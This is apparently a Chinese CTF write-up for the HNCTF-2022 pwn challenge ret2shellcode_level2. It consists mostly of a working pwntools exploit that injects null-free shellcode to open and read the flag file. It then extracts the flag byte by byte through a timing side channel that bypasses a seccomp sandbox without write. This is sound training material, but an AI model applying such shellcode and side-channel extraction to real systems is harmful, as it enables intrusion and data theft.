---
title: NSSCTF-HNCTF-2022-ret2shellcode_level2 题解
date: 2026-02-06 20:18:00
tags: 
    - shellcode 技巧
    - 侧信道爆破
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/3026)

### checksec

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/HNCTF-2022-ret2shellcode_level2/checksec.png)

### IDA

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/HNCTF-2022-ret2shellcode_level2/main.png)

bss 段为 rwx ， buff 在 bss 段上，但是注意 strcpy 会被 \x00 截断，因此写入的 shellcode 不能有 \x00

![这是什么鸭](https://pic.ratherhard.com/post/NSSCTF/HNCTF-2022-ret2shellcode_level2/seccomp.png)

白名单沙箱：仅允许 open 、 read 、 mmap 系统调用

没有 write ，因此考虑侧信道爆破，再加一点小巧思避免 \x00 出现即可

### exp

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

def conn():
	if debug:
		return process('./ret2shellcode_level2')
	else:
		return remote('node5.anna.nssctf.cn', 28199)

rwx_base = 0x404060
again_addr = 0x40132B

def scgen(idx, char):
	sth = f'mov cl, 0x{idx:x}'
	sc = asm(f'''
		xor rdi, rdi
		xor rsi, rsi
		xor rdx, rdx
		  
		xor rax, rax
		add al, 0x67
		shl rax, 8
		add al, 0x61
		shl rax, 8
		add al, 0x6c
		shl rax, 8
		add al, 0x66
		shl rax, 8
		add al, 0x2f
		push rax
		push rsp
		pop rdi
		xor rax, rax
		add al, 2
		syscall

		xor rdi, rdi
		add dil, 3
		push rsp
		pop rsi
		xor rdx, rdx
		add dl, 0x7f
		xor rax, rax
		syscall

		xor rcx, rcx
		{'' if idx == 0 else sth}
		mov al, [rsp + rcx]
		cmp al, 0x{char:x}
		LOOP:
		je LOOP
	''')
	return sc

def test(idx, char):
	io = conn()
	sc = scgen(idx, char).ljust(0x100, b'\x00')
	payload = sc + p64(rwx_base + 0x400) + p64(rwx_base)
	io.sendline(payload)
	start_time = time.time()
	io.recvall(timeout = 2)
	end_time = time.time()
	io.close()
	return end_time - start_time

def attack():
	flag = ''
	idx = len(flag)
	while True:
		for char in range(32, 127):
			try:
				if test(idx, char) > 1.7:
					print(f'Found char at {idx}: {chr(char)} | Current Flag: {flag}')
					flag += chr(char)
					if chr(char) == '}':
						return flag
					break
				else:
					print(f'Test char failed at {idx}: {chr(char)} | Current Flag: {flag}')
			except Exception as e:
				char -= 1
				print(f'Error:{e}')
				continue
		idx += 1
	return flag

print(f"Flag: {attack()}")
```